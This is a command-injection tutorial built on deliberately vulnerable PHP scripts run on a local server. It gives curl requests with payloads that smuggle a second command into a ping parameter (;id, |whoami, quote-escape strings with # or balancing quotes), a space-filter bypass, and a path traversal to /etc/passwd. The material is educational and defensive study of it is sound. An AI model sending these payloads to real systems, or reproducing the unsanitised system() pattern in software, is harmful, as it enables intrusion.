# Command Injection

## Goal

Learning goals:

- understand the basic behavior of the shell parser
- understand command separators
- understand quote boundaries
- understand the core idea of command injection
- reason about payloads through parser flow rather than memorization

---

# Environment

## Local PHP Server

Run the PHP built-in server with the current directory as the web root:

```bash
php -S localhost:8000
```

Test request:

```bash
curl 'http://localhost:8000/session01_1.php?ip=127.0.0.1'
```

---

# Vulnerable Examples

## `session01_1.php`

Basic command injection example:

```php
<?php
$ip = $_GET['ip'];
system("ping -c 1 $ip");
?>
```

Core idea:

```text
user input
→ inserted directly into a shell command
→ the shell parser may reinterpret it as syntax
```

---

## `session01_2.php`

Single-quoted variant:

```php
<?php
$ip = $_GET['ip'];
system("ping -c 1 '$ip'");
?>
```

Core idea:

```text
inside single quotes,
shell operators such as ; | &&
become ordinary characters
```

---

## `session01_3.php`

Variant with a space-removal filter:

```php
<?php
$ip = str_replace(" ", "", $_GET['ip']);
system("ping -c 1 '$ip'");
?>
```

Core idea:

```text
removing spaces
≠
removing shell syntax
```

---

# Core Concepts

---

# 1. Basic Command Injection

## Semicolon Injection

Payload:

```text
127.0.0.1;id
```

Request:

```bash
curl 'http://localhost:8000/session01_1.php?ip=127.0.0.1;id'
```

What the shell sees:

```bash
ping -c 1 127.0.0.1;id
```

Shell parser view:

```text
command1: ping -c 1 127.0.0.1
operator: ;
command2: id
```

Core point:

```text
; is a command separator
```

---

# 2. `&&` Operator

Payload:

```text
127.0.0.1&&id
```

Required URL encoding:

```text
&&
→ %26%26
```

Request:

```bash
curl 'http://localhost:8000/session01_1.php?ip=127.0.0.1%26%26id'
```

Shell command:

```bash
ping -c 1 127.0.0.1&&id
```

Meaning:

```text
the second command runs only if
the first command succeeds
```

## Failure Example

```bash
curl 'http://localhost:8000/session01_1.php?ip=nosuchhost%26%26id'
```

Result:

```text
ping fails
→ non-zero exit status
→ id does not run
```

---

# 3. Pipe Operator

Payload:

```text
127.0.0.1|whoami
```

Encoding:

```text
|
→ %7C
```

Request:

```bash
curl 'http://localhost:8000/session01_1.php?ip=127.0.0.1%7Cwhoami'
```

Shell command:

```bash
ping -c 1 127.0.0.1 | whoami
```

Core point:

```text
stdout
→ pipe
→ stdin
```

But:

```text
whoami does not read stdin
```

So:

```text
ping output disappears
and only whoami output is visible
```

---

# 4. Quote Boundary

## Why Injection Fails Inside Quotes

Code:

```php
system("ping -c 1 '$ip'");
```

Payload:

```text
127.0.0.1;id
```

Shell command:

```bash
ping -c 1 '127.0.0.1;id'
```

Parser view:

```text
; is inside the quote
→ it is ordinary data
→ not an active operator
```

That means the whole string becomes one token.

---

# 5. Quote Escape

## Goal

Current structure:

```bash
ping -c 1 '$ip'
```

Attacker goal:

```text
close the quote
→ append a command
→ restore quote balance
```

## Important Insight

If the payload is only:

```text
'
```

then the result becomes:

```bash
ping -c 1 '''
```

and quote balance breaks, producing a shell syntax error.

---

# 6. Successful Quote Escape

Payload structure:

```text
DATA' ; id ; '
```

Example encoding:

```text
127.0.0.1%27%20;%20id%20;%20%27
```

Request:

```bash
curl 'http://localhost:8000/session01_2.php?ip=127.0.0.1%27%20;%20id%20;%20%27'
```

Final shell command:

```bash
ping -c 1 '127.0.0.1' ; id ; ''
```

Parser view:

```text
command1: ping -c 1 '127.0.0.1'
operator: ;
command2: id
operator: ;
command3: ''
```

---

# 7. Why Empty Quotes Are Needed

```bash
''
```

Role:

```text
it restores overall quote balance
```

Core point:

```text
closing the quote is not enough
the whole shell syntax must still be balanced
```

---

# 8. Space Filter Bypass

Server filter:

```php
$ip = str_replace(" ", "", $_GET['ip']);
```

Payload:

```text
';id;'
```

Encoding:

```text
%27;id;%27
```

Request:

```bash
curl 'http://localhost:8000/session01_3.php?ip=%27;id;%27'
```

Final shell command:

```bash
ping -c 1 '';id;''
```

Core point:

```text
; is shell syntax
so it can create command boundaries even without spaces
```

---

# Useful Reference

## Important URL Encodings

| Character | Encoding |
|---|---|
| `'` | `%27` |
| `&` | `%26` |
| `|` | `%7C` |
| `space` | `%20` |

## Important Concepts

### Parser Layers

```text
HTTP parser
→ URL decoding
→ PHP interpolation
→ shell parsing
→ command execution
```

### Command Injection Core Idea

```text
data
→ reinterpreted as syntax
```

The vulnerability appears when user input becomes part of shell grammar.

### Reusable Exploitation Pattern

```text
escape
→ append
→ rebalance
```

Example structure:

```text
'
;id;
'
```

Meaning:

```text
close quote
→ inject command
→ restore quote balance
```

---

# Mental Model

## Final Takeaway

Correct mindset:

```text
memorizing payloads
X

tracking parser state
O
```

Command injection is not mainly about inserting characters. It is about reconstructing parser behavior.

---

# Additional Notes

## 1. What Is `php -S localhost:8000`?

```bash
php -S localhost:8000
```

means:

```text
run the PHP built-in development web server
```

Breakdown:

| Part | Meaning |
|---|---|
| `php` | run the PHP interpreter |
| `-S` | server mode |
| `localhost` | listen on the local machine |
| `8000` | TCP port |

That means HTTP requests to `http://localhost:8000` are handled by PHP.

## What Is `localhost`?

```text
localhost
→ the current machine itself
```

Usually it is equivalent to:

```text
127.0.0.1
```

So:

```bash
curl http://localhost:8000
```

means:

```text
send an HTTP request to port 8000 on my own machine
```

## 2. Why Did `session01_*.php` Run?

Because the server was launched inside the directory that contains those files.

The PHP built-in server uses:

```text
the current directory
=
the document root
```

So a URL path such as:

```text
http://localhost:8000/session01_1.php
```

maps to the filesystem path for `session01_1.php` in that directory.

## Browser ↔ Filesystem Mapping

Web servers map:

```text
URL path
→ filesystem path
```

This is why a browser request can trigger a local PHP file.

## 3. Is the Web Server Structure Fixed?

No universal standard exists, but common layouts do exist.

Examples:

### Apache

```text
/var/www/html/
```

### Nginx

```text
/usr/share/nginx/html/
```

### PHP Frameworks

Common directories include:

```text
/public
/app
/storage
/config
```

## Why Attackers Usually Do Not Know the Structure

Most web attacks start without direct filesystem access.

Typical attacker limitations:

- can only observe HTTP responses
- no SSH access
- no shell access
- cannot run `ls`

So the attacker must infer structure indirectly through server behavior.

## How Paths Are Usually Found

### 1. URL Enumeration

Guess common paths such as:

```text
/admin
/login
/uploads
/api
```

### 2. Directory Bruteforce

Tools such as:

```text
ffuf
dirsearch
gobuster
```

can discover existing endpoints.

### 3. Error Message Leakage

For example:

```text
Warning: include(/var/www/html/test.php)
```

may reveal real filesystem paths.

### 4. Source Code Leakage

Examples:

```text
.git exposure
backup.zip
.env
config.php~
```

### 5. LFI / Path Traversal

Example:

```text
?page=../../../../etc/passwd
```

## Why This Matters for Command Injection

Command injection is powerful because it can move an attacker from:

```text
HTTP-only visibility
```

to something much closer to:

```text
shell-level visibility
```

After successful injection, commands such as:

```bash
;pwd;
;ls;
;whoami;
```

may become possible.

---

## PHP `system()` Command Injection: Single-Quote Escape Summary

### 1. Current PHP Code Structure

```php
$ip = $_GET['ip'];
system("ping -c 1 '$ip'");
```

The intended shell structure is:

```bash
ping -c 1 'user_input'
```

### 2. With Normal Input

Input:

```text
?ip=127.0.0.1
```

Final shell command:

```bash
ping -c 1 '127.0.0.1'
```

### 3. The Key Problem

The server already places single quotes around the attacker-controlled value.

That means the attacker input can become part of shell syntax, not just data.

### 4. Quote-Escape Reasoning

Example attack input:

```text
127.0.0.1'; id #
```

Final command:

```bash
ping -c 1 '127.0.0.1'; id #'
```

Practical effect:

```bash
ping -c 1 127.0.0.1
id
```

### 5. Why `#` Helps

The trailing `#` comments out the server-side leftover quote.

### 6. Balancing Without `#`

Alternative input:

```text
127.0.0.1'; id; '
```

Final command:

```bash
ping -c 1 '127.0.0.1'; id; ''
```

Here the final `''` becomes an empty string token and keeps syntax balanced.

### 7. Two Common Patterns

#### Pattern 1: Comment Out the Remainder

```text
127.0.0.1'; id #
```

#### Pattern 2: Rebalance the Quotes

```text
127.0.0.1'; id; '
```

### 8. Distinguish the Local Shell from the Server Shell

When you run `curl`, your local shell parses the command first.

So:

```bash
curl 'http://localhost:8000/session01_2.php?ip=127.0.0.1'; id #
```

breaks locally instead of sending the whole payload to the server.

### 9. Why URL Encoding Is Needed

Characters such as `'`, `;`, `#`, and spaces may be interpreted too early by either:

- the local shell
- the URL layer

Useful encodings:

```text
'  -> %27
;  -> %3B
space -> %20
#  -> %23
```

### 10. Full Interpretation Order

```text
1. the local shell parses the curl command
2. curl sends the URL to the server
3. PHP receives $_GET['ip']
4. PHP constructs system("ping -c 1 '$ip'")
5. the server-side shell parses the final string
6. quote, ;, and # gain their meaning there
```

### 11. Summary Questions to Ask

```text
1. what characters does the server add around my input?
2. is my input inside a quote or outside it?
3. can I close the quote?
4. can I add a command separator after closing it?
5. how will I deal with trailing characters?
6. do I need URL encoding to avoid earlier parsing?
```

### 12. Final Conclusion

Server code:

```php
system("ping -c 1 '$ip'");
```

Attack input:

```text
127.0.0.1'; id #
```

Final command:

```bash
ping -c 1 '127.0.0.1'; id #'
```

Core idea:

```text
close the server-opened quote with attacker input
→ add a new command with ;
→ neutralize the trailing quote with # or a balancing quote
```

# QA

**Q1.**
Why does `;` not act as an operator inside quotes?

<details>
<summary><strong>A1.</strong></summary>

The shell first determines the quote state. Inside:

```text
' ... '
```

the contents form a protected literal region. Therefore:

```text
;
|
&&
```

are ordinary characters rather than operators.

</details>

---

**Q2.**
Why did `&&` initially fail to work?

<details>
<summary><strong>A2.</strong></summary>

The HTTP query parser interpreted `&` as a parameter separator before the
value reached the shell. URL encoding is therefore required:

```text
&&
→ %26%26
```

</details>

---

**Q3.**
Why are empty quotes (`''`) needed?

<details>
<summary><strong>A3.</strong></summary>

They consume the quote appended by the server and restore balanced shell
syntax.

</details>

---

**Q4.**
Why did the space-removal filter fail?

<details>
<summary><strong>A4.</strong></summary>

Shell grammar does not depend only on spaces. Operators such as:

```text
;
|
&&
```

can create command boundaries without surrounding whitespace.

</details>
